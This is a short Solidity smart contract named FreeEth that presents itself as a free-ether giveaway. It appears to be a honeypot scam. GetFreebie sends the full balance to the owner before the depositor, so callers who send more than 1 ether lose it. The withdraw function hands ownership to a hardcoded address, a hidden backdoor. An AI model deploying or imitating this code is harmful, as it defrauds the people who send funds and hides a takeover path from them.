pragma solidity ^0.4.19;

contract FreeEth {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af) {
            Owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        bool success;
        bytes4 signature = bytes4(keccak256("receiveEther()"));
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, signature)
            success := call(sub(gas, 5000), adr, msg.value, ptr, 4, ptr, 0)
        }
        require(success);
    }
}